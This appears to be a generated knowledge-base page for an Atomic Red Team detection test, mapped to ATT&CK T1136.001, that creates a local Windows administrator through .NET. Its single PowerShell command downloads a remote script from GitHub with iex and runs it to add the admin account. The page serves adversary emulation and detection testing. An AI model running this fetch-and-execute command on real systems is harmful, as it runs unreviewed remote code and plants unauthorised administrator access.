---
atomic_guid: "2170d9b5-bacd-4819-a952-da76dae0815f"
title: "Create a new Windows admin user via .NET"
framework: "atomic"
generated: "true"
attack_technique_id: "T1136.001"
attack_technique_name: "Create Account: Local Account"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.001/T1136.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "2170d9b5-bacd-4819-a952-da76dae0815f"
  - "Create a new Windows admin user via .NET"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Create a new Windows admin user via .NET

Creates a new admin user in a powershell session without using net.exe

## Metadata

- Atomic GUID: 2170d9b5-bacd-4819-a952-da76dae0815f
- Technique: T1136.001: Create Account: Local Account
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1136.001/T1136.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1136-create_account|T1136.001]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.001/T1136.001.yaml)
